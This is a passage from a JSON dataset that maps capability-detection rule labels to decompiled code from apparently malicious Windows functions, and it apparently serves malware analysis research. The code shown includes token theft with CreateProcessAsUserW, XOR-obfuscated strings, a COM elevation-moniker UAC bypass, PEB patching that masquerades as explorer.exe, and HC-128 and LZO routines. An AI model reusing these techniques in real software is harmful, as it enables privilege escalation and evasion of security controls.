ZEXT48(&var_86h) << 0x20;\n        _var_ach = ZEXT816(0);\n        iVar6 = (*pcVar5)();\n        if (iVar6 != -1) {\n            iVar6 = (*pcVar4)(iVar6, &hExistingToken);\n            pcVar5 = _sym.imp.KERNEL32.dll_CloseHandle;\n            if (iVar6 == 0) {\n                iVar6 = (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, var_28h, 0, 0, 0, 0x10, 0, 0, &var_f8h, &var_ach);\n                if (iVar6 != 0) {\n                    (*pcVar5)(var_ach);\n                    (*pcVar5)(var_a8h);\n                    return 1;\n                }\n            }\n            else {\n                iVar6 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0xf01ff, 0, 3, 1, &hToken);\n                if (iVar6 != 0) {\n                    (*pcVar5)(hExistingToken);\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                                      (hToken, 0, var_28h, 0, 0, 0, 0x10, 0, 0, &var_f8h, &var_ach);\n                    if (iVar6 != 0) {\n                        (*pcVar5)(hToken);\n                        (*pcVar5)(var_ach);\n                        (*pcVar5)(var_a8h);\n                        return 1;\n                    }\n                    (*pcVar5)(hToken);\n                    return 0;\n                }\n                (*pcVar5)(hExistingToken);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 2270
    },
    "0041dfb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0041dfb0(uint param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    code *pcVar6;\n    uint *puVar7;\n    uint var_178h;\n    uint ARG_0;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    ushort var_1bh;\n    uchar var_19h;\n    uint ARG_1;\n    uchar var_14h;\n    uchar var_13h;\n    uchar var_12h;\n    uchar var_11h;\n    uchar var_10h;\n    uchar var_fh;\n    uchar var_eh;\n    uchar var_dh;\n    uint var_ch;\n    uchar var_8h;\n    uchar var_7h;\n    uchar var_6h;\n    uchar var_5h;\n    uchar var_4h;\n    uchar var_3h;\n    uchar var_2h;\n    uint var_1h;\n    \n    var_2ch = 0;\n    var_30h._0_2_ = 0;\n    ARG_1._0_2_ = 0x5325;\n    ARG_1._2_1_ = 0;\n    var_34h = 0x530025;\n    (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, &ARG_1, param_1);\n    fcn.0041e150();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    var_ch._0_1_ = 0x60;\n    var_14h = 0x3d;\n    var_13h = 0x57;\n    var_1h._0_1_ = 0x12;\n    var_11h = 0x32;\n    var_eh = 0x32;\n    var_12h = 0x53;\n    var_dh = 0;\n    var_fh = 0x33;\n    var_ch._1_1_ = 0x69;\n    var_10h = 0x5f;\n    var_5h = 100;\n    var_2h = 0;\n    var_4h = 100;\n    var_ch._2_1_ = 0x6e;\n    var_ch._3_1_ = 0x65;\n    var_7h = 0x5f;\n    var_6h = 0x61;\n    var_8h = 0x74;\n    var_3h = 0x72;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&var_13h, &var_ch + 1);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    var_27h = 0x60717314;\n    var_23h = 0x60677b7c;\n    var_1fh = 0x70756d76;\n    uVar5 = 0;\n    var_1bh = 0x6670;\n    do {\n        puVar1 = &var_27h + uVar5 + 1;\n        *puVar1 = *puVar1 ^ 0x14;\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0xd);\n    var_19h = 0;\n    uVar3 = (*pcVar2)(&var_13h, &var_27h + 1);\n    pcVar6 = (*pcVar6)(uVar3);\n    if ((((pcVar4 != NULL) && (pcVar6 != NULL)) && (var_2ch = (*pcVar4)(&ARG_0),  var_2ch != -1)) &&\n       (puVar7 = (*pcVar6)(&var_2ch, 4, 2),  puVar7 != NULL)) {\n        fcn.0040cc00(&var_178h, 0, 0x100);\n        (*_sym.imp.USER32.dll_wsprintfW)(&var_178h, &var_34h, *puVar7);\n        fcn.0041e150();\n    }\n    return 1;\n}\n",
        "token_count": 1011
    },
    "0041e5e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0041e5e0(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_230h;\n    int32_t var_22ch;\n    uint ARG_1;\n    int32_t var_124h;\n    uint name;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint argp;\n    \n    _var_14h = 0;\n    name._0_2_ = 2;\n    var_18h = (*_sym.imp.WS2_32.dll_inet_addr)(param_1);\n    name._2_2_ = (*_sym.imp.WS2_32.dll_htons)(param_2);\n    if ((var_18h != -1) && (iVar1 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 6),  iVar1 != -1)) {\n        argp = 1;\n        iVar2 = (*_sym.imp.WS2_32.dll_ioctlsocket)(iVar1, 0x8004667e, &argp);\n        if (iVar2 != -1) {\n            iVar2 = (*_sym.imp.WS2_32.dll_connect)(iVar1, &name, 0x10);\n            if (iVar2 != -1) {\ncode_r0x0041e6d8:\n                (*_sym.imp.WS2_32.dll_closesocket)(iVar1);\n                return 1;\n            }\n            iVar2 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n            if (iVar2 == 0x2733) {\n                var_230h = 1;\n                ARG_1 = 1;\n                var_ch = 5;\n                var_8h = 0;\n                var_22ch = iVar1;\n                var_124h = iVar1;\n                iVar2 = (*_sym.imp.WS2_32.dll_select)(0, 0, &var_230h, &ARG_1, &var_ch);\n                if (0 < iVar2) {\n                    iVar2 = (*_sym.imp.WS2_32.dll___WSAFDIsSet)(iVar1, &ARG_1);\n                    if (iVar2 != 0) {\n                        return 0;\n                    }\n                    goto code_r0x0041e6d8;\n                }\n            }\n        }\n        (*_sym.imp.WS2_32.dll_closesocket)(iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 572
    },
    "00402ef0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402ef0(uint *arg_8h, uint32_t arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_ch_00;\n    uint var_4h;\n    \n    arg_ch_00 = ((arg_ch & 3) != 0) + (arg_ch >> 2);\n    if (arg_8h[1] != arg_ch_00) {\n        if (arg_8h[2] != 0) {\n            fcn.00408120(arg_8h[2], arg_8h[1] << 2);\n            sub.msvcrt.dll_free(arg_8h[2]);\n        }\n        *arg_8h = 1;\n        arg_8h[1] = 0;\n        arg_8h[2] = 0;\n        if (10000 < arg_ch_00) {\n            return -0x10;\n        }\n        if (arg_ch_00 != 0) {\n            iVar1 = sub.msvcrt.dll_calloc(arg_ch_00, 4);\n            if (iVar1 == 0) {\n                return -0x10;\n            }\n            if (arg_8h[2] != 0) {\n                fcn.0040cbe0(iVar1, arg_8h[2], arg_8h[1] << 2);\n                fcn.00408120(arg_8h[2], arg_8h[1] << 2);\n                sub.msvcrt.dll_free(arg_8h[2]);\n            }\n            arg_8h[1] = arg_ch_00;\n            arg_8h[2] = iVar1;\n        }\n    }\n    iVar1 = fcn.00403e10(arg_8h, 0);\n    if (iVar1 == 0) {\n        (*arg_10h)(arg_14h, arg_8h[2] + (arg_ch_00 * 4 - arg_ch), arg_ch);\n        fcn.004048c0(arg_8h[2], arg_ch_00);\n    }\n    return iVar1;\n}\n",
        "token_count": 476
    },
    "00404300": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404300(uint *arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_ch_00;\n    uint var_4h;\n    \n    arg_ch_00 = ((arg_10h & 3) != 0) + (arg_10h >> 2);\n    if (arg_8h[1] != arg_ch_00) {\n        if (arg_8h[2] != 0) {\n            fcn.00408120(arg_8h[2], arg_8h[1] << 2);\n            sub.msvcrt.dll_free(arg_8h[2]);\n        }\n        *arg_8h = 1;\n        arg_8h[1] = 0;\n        arg_8h[2] = 0;\n        if (10000 < arg_ch_00) {\n            return -0x10;\n        }\n        if (arg_ch_00 != 0) {\n            iVar1 = sub.msvcrt.dll_calloc(arg_ch_00, 4);\n            if (iVar1 == 0) {\n                return -0x10;\n            }\n            if (arg_8h[2] != 0) {\n                fcn.0040cbe0(iVar1, arg_8h[2], arg_8h[1] << 2);\n                fcn.00408120(arg_8h[2], arg_8h[1] << 2);\n                sub.msvcrt.dll_free(arg_8h[2]);\n            }\n            arg_8h[1] = arg_ch_00;\n            arg_8h[2] = iVar1;\n        }\n    }\n    iVar1 = fcn.00403e10(arg_8h, 0);\n    if ((iVar1 == 0) && (arg_ch != 0)) {\n        fcn.0040cbe0(arg_8h[2] + (arg_ch_00 * 4 - arg_10h), arg_ch, arg_10h);\n        fcn.004048c0(arg_8h[2], arg_ch_00);\n    }\n    return iVar1;\n}\n",
        "token_count": 486
    },
    "00404810": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404810(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    uint var_4h;\n    \n    iVar1 = *(arg_8h + 4);\n    uVar2 = iVar1 * 4;\n    if (uVar2 < arg_10h) {\n        iVar4 = arg_ch + iVar1 * -4 + arg_10h;\n        fcn.0040cc00(arg_ch, 0, arg_10h + iVar1 * -4);\n        arg_10h = uVar2;\n        arg_ch = iVar4;\n    }\n    else if (arg_10h < uVar2) {\n        uVar3 = arg_10h;\n        do {\n            if (*(*(arg_8h + 8) + (uVar3 & 0xfffffffc)) >> ((uVar3 & 3) << 3) != '\\0') {\n                return 0xfffffff8;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < uVar2);\n    }\n    if (arg_10h != 0) {\n        uVar2 = 0;\n        puVar5 = arg_ch + -1 + arg_10h;\n        do {\n            uVar3 = uVar2 + 1;\n            *puVar5 = *(*(arg_8h + 8) + (uVar2 & 0xfffffffc)) >> ((uVar2 & 3) << 3);\n            uVar2 = uVar3;\n            puVar5 = puVar5 + -1;\n        } while (uVar3 < arg_10h);\n    }\n    return 0;\n}\n",
        "token_count": 414
    },
    "0041e7e0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041e7e0(uint noname_0, uint *arg_ch)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    ulong uVar9;\n    uint pszName;\n    uint pBindOptions;\n    uint var_8ch;\n    uint var_7ah;\n    uint var_76h;\n    uint var_72h;\n    uint var_6eh;\n    uint var_6ah;\n    uint var_66h;\n    uint var_62h;\n    uint var_5eh;\n    uint var_5ah;\n    uint var_56h;\n    uint var_52h;\n    uint var_4eh;\n    uint var_4ah;\n    uint var_46h;\n    uint var_42h;\n    uint var_3eh;\n    uint16_t var_3ah;\n    uint16_t var_38h;\n    uint16_t var_36h;\n    uint16_t var_34h;\n    uint16_t var_32h;\n    uint16_t var_30h;\n    uint16_t var_2eh;\n    uint16_t var_2ch;\n    uint16_t var_2ah;\n    uint16_t var_28h;\n    uint16_t var_26h;\n    uint16_t var_24h;\n    uint16_t var_22h;\n    uint16_t var_20h;\n    uint16_t var_1eh;\n    uint16_t var_1ch;\n    uint16_t var_1ah;\n    uint16_t var_18h;\n    uint16_t var_16h;\n    uint16_t var_14h;\n    uint16_t var_12h;\n    uint16_t var_10h;\n    uint16_t var_eh;\n    uint16_t var_ch;\n    uint16_t var_ah;\n    uint16_t var_8h;\n    ushort var_6h;\n    uint ppv;\n    \n    ppv = 0;\n    uVar9 = fcn.0040cd20();\n    puVar8 = uVar9 >> 0x20;\n    if (0x40 < uVar9) {\n        *arg_ch = 0;\n        return 0x80004005;\n    }\n    uVar4 = 0x24;\n    puVar7 = &pBindOptions;\n    do {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n        uVar4 = uVar4 - 1;\n    } while (uVar4 != 0);\n    pBindOptions = 0x24;\n    var_3eh._0_2_ = *0x424216 ^ 0x15;\n    var_8ch = 4;\n    var_3eh._2_2_ = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[0] ^ 0x15;\n    var_7ah = 0x500015;\n    var_3ah = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[1] ^ 0x15;\n    var_76h = 0x700079;\n    var_38h = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[2] ^ 0x15;\n    var_72h = 0x740063;\n    var_36h = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[3] ^ 0x15;\n    var_6eh = 0x7c0061;\n    var_34h = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[4] ^ 0x15;\n    var_6ah = 0x7b007a;\n    var_32h = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[5] ^ 0x15;\n    var_66h = 0x54002f;\n    var_30h = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[6] ^ 0x15;\n    var_62h = 0x780071;\n    var_2eh = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[7] ^ 0x15;\n    var_5eh = 0x7b007c;\n    var_2ch = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[8] ^ 0x15;\n    var_5ah = 0x66007c;\n    var_2ah = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[9] ^ 0x15;\n    var_56h = 0x670061;\n    var_28h = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[10] ^ 0x15;\n    var_52h = 0x610074;\n    var_26h = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[11] ^ 0x15;\n    var_4eh = 0x67007a;\n    var_24h = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[12] ^ 0x15;\n    var_4ah = 0x7b0034;\n    var_22h = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[13] ^ 0x15;\n    var_46h = 0x620070;\n    var_20h = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[14] ^ 0x15;\n    var_42h = 0x15002f;\n    var_1eh = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[15] ^ 0x15;\n    var_1ch = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[16] ^ 0x15;\n    var_1ah = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[17] ^ 0x15;\n    var_18h = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[18] ^ 0x15;\n    var_16h = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[19] ^ 0x15;\n    var_14h = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[20] ^ 0x15;\n    var_12h = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[21] ^ 0x15;\n    var_10h = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[22] ^ 0x15;\n    var_eh = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[23] ^ 0x15;\n    var_ch = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[24] ^ 0x15;\n    var_ah = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[25] ^ 0x15;\n    var_8h = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7[26] ^ 0x15;\n    var_6h = 0;\n    do {\n        *(&var_7ah + uVar4 * 2 + 2) = *(&var_7ah + uVar4 * 2 + 2) ^ 0x15;\n        uVar4 = uVar4 + 1;\n    } while (uVar4 < 0x39);\n    var_6h = 0;\n    iVar5 = 0;\n    do {\n        iVar2 = *(&var_7ah + iVar5 + 2);\n        *(&pszName + iVar5) = iVar2;\n        iVar5 = iVar5 + 2;\n        puVar7 = puVar8;\n    } while (iVar2 != 0);\n    do {\n        iVar2 = *puVar7;\n        puVar7 = puVar7 + 2;\n    } while (iVar2 != 0);\n    uVar4 = puVar7 - puVar8;\n    puVar7 = &stack0xfffffd52;\n    do {\n        piVar1 = puVar7 + 2;\n        puVar7 = puVar7 + 2;\n    } while (*piVar1 != 0);\n    for (uVar6 = uVar4 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar7 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar7 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    uVar3 = (*_sym.imp.ole32.dll_CoGetObject)(&pszName, &pBindOptions);\n    *arg_ch = ppv;\n    return uVar3;\n}\n",
        "token_count": 2354
    },
    "0041fa80": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041fa80(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int16_t *piVar8;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t in_FS_OFFSET;\n    uint lpBuffer;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    ushort var_54h;\n    uint var_52h;\n    uint16_t var_4eh;\n    uint16_t var_4ch;\n    uint16_t var_4ah;\n    uint16_t var_48h;\n    uint16_t var_46h;\n    uint16_t var_44h;\n    uint16_t var_42h;\n    uint16_t var_40h;\n    uint16_t var_3eh;\n    uint16_t var_3ch;\n    uint16_t var_3ah;\n    ushort var_38h;\n    uint var_36h;\n    uint var_32h;\n    uint var_2eh;\n    uint var_2ah;\n    uint var_26h;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint16_t var_16h;\n    uint16_t var_14h;\n    uint16_t var_12h;\n    uint16_t var_10h;\n    uint16_t var_eh;\n    uint16_t var_ch;\n    uint16_t var_ah;\n    uint16_t var_8h;\n    uint16_t var_6h;\n    uint16_t var_4h;\n    ushort var_2h;\n    \n    iVar2 = *(*(in_FS_OFFSET + 0x18) + 0x30);\n    *0x42934c = NULL;\n    var_74h = 0x1000;\n    iVar4 = (*_sym.imp.ntdll.dll_NtAllocateVirtualMemory)(0xffffffff, 0x42934c, 0, &var_74h, 0x3000, 4);\n    if (-1 < iVar4) {\n        (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)(&lpBuffer, 0x104);\n        puVar6 = &lpBuffer;\n        piVar8 = *0x42934c;\n        do {\n            iVar1 = *puVar6;\n            puVar6 = puVar6 + 2;\n            *piVar8 = iVar1;\n            piVar8 = piVar8 + 1;\n        } while (iVar1 != 0);\n        var_70h = 0x63003f;\n        var_52h._0_2_ = str.explorer.exe[0] ^ 0x3f;\n        var_6ch = 0x47005a;\n        var_52h._2_2_ = str.explorer.exe[1] ^ 0x3f;\n        var_68h = 0x53004f;\n        var_4eh = str.explorer.exe[2] ^ 0x3f;\n        var_64h = 0x4d0050;\n        var_4ch = str.explorer.exe[3] ^ 0x3f;\n        var_60h = 0x4d005a;\n        var_4ah = str.explorer.exe[4] ^ 0x3f;\n        var_5ch = 0x5a0011;\n        var_48h = str.explorer.exe[5] ^ 0x3f;\n        var_58h = 0x5a0047;\n        var_46h = str.explorer.exe[6] ^ 0x3f;\n        var_54h = 0x3f;\n        var_44h = str.explorer.exe[7] ^ 0x3f;\n        var_42h = str.explorer.exe[8] ^ 0x3f;\n        var_40h = str.explorer.exe[9] ^ 0x3f;\n        var_3eh = str.explorer.exe[10] ^ 0x3f;\n        var_3ch = str.explorer.exe[11] ^ 0x3f;\n        var_3ah = str.explorer.exe[12] ^ 0x3f;\n        var_38h = 0;\n        uVar7 = 0;\n        do {\n            *(&var_70h + uVar7 * 2 + 2) = *(&var_70h + uVar7 * 2 + 2) ^ 0x3f;\n            uVar7 = uVar7 + 1;\n        } while (uVar7 < 0x1b);\n        var_38h = 0;\n        puVar6 = &var_70h + 2;\n        puVar5 = puVar6;\n        do {\n            iVar1 = *puVar5;\n            puVar5 = puVar5 + 2;\n        } while (iVar1 != 0);\n        puVar10 = *0x42934c + -1;\n        do {\n            piVar8 = puVar10 + 2;\n            puVar10 = puVar10 + 2;\n        } while (*piVar8 != 0);\n        puVar9 = puVar6;\n        for (uVar7 = puVar5 - puVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n            *puVar10 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar10 = puVar10 + 1;\n        }\n        for (uVar7 = puVar5 - puVar6 & 3; uVar7 != 0; uVar7 = uVar7 - 1) {\n            *puVar10 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar10 = puVar10 + 1;\n        }\n    }\n    (*_sym.imp.ntdll.dll_RtlAcquirePebLock)();\n    pcVar3 = _sym.imp.ntdll.dll_RtlInitUnicodeString;\n    var_36h = 0x330056;\n    var_1ah._0_2_ = *0x4241da ^ 0x56;\n    var_32h = 0x26002e;\n    var_1ah._2_2_ = str.Elevation:Administrator_new:[0] ^ 0x56;\n    var_2eh = 0x39003a;\n    var_16h = str.Elevation:Administrator_new:[1] ^ 0x56;\n    var_2ah = 0x330024;\n    var_14h = str.Elevation:Administrator_new:[2] ^ 0x56;\n    var_26h = 0x780024;\n    var_12h = str.Elevation:Administrator_new:[3] ^ 0x56;\n    var_22h = 0x2e0033;\n    var_10h = str.Elevation:Administrator_new:[4] ^ 0x56;\n    var_1eh = 0x560033;\n    var_eh = str.Elevation:Administrator_new:[5] ^ 0x56;\n    var_ch = str.Elevation:Administrator_new:[6] ^ 0x56;\n    var_ah = str.Elevation:Administrator_new:[7] ^ 0x56;\n    var_8h = str.Elevation:Administrator_new:[8] ^ 0x56;\n    var_6h = str.Elevation:Administrator_new:[9] ^ 0x56;\n    var_4h = str.Elevation:Administrator_new:[10] ^ 0x56;\n    var_2h = 0;\n    uVar7 = 0;\n    do {\n        *(&var_36h + uVar7 * 2 + 2) = *(&var_36h + uVar7 * 2 + 2) ^ 0x56;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0x19);\n    var_2h = 0;\n    (*_sym.imp.ntdll.dll_RtlInitUnicodeString)(*(iVar2 + 0x10) + 0x38, *0x42934c);\n    (*pcVar3)(*(iVar2 + 0x10) + 0x40, &var_36h + 2);\n    (*_sym.imp.ntdll.dll_RtlReleasePebLock)();\n    (*_sym.imp.ntdll.dll_LdrEnumerateLoadedModules)(0, fcn.0041eaf0, 0);\n    return;\n}\n",
        "token_count": 1960
    },
    "00404640": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404640(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401f60(arg_8h);\n    return iVar1 + 7U >> 3;\n}\n",
        "token_count": 56
    },
    "00404ff0": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404ff0(uint32_t arg_8h, uint32_t *arg_ch, uint32_t *arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    if (0xf < arg_8h) {\n        var_8h = arg_8h >> 4;\n        do {\n            uVar4 = *arg_ch * arg_14h;\n            uVar5 = uVar4 + var_4h;\n            uVar6 = (*arg_ch * arg_14h >> 0x20) + CARRY4(uVar4, var_4h) + CARRY4(uVar5, *arg_10h);\n            puVar1 = arg_10h + 1;\n            *arg_10h = uVar5 + *arg_10h;\n            uVar4 = arg_ch[1] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[1] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 2;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[2] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[2] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 3;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[3] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[3] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 4;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[4] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[4] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 5;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[5] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[5] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 6;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[6] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[6] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 7;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[7] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[7] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 8;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[8] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[8] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 9;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[9] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[9] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 10;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[10] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[10] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 0xb;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[0xb] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[0xb] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 0xc;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[0xc] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[0xc] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 0xd;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[0xd] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[0xd] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 0xe;\n            *puVar1 = uVar5 + *puVar1;\n            puVar1 = arg_ch + 0xf;\n            uVar4 = arg_ch[0xe] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[0xe] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar3 = arg_10h + 0xf;\n            *puVar2 = uVar5 + *puVar2;\n            arg_ch = arg_ch + 0x10;\n            uVar4 = *puVar1 * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            var_4h = (*puVar1 * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar3);\n            arg_10h = arg_10h + 0x10;\n            *puVar3 = uVar5 + *puVar3;\n            arg_8h = arg_8h - 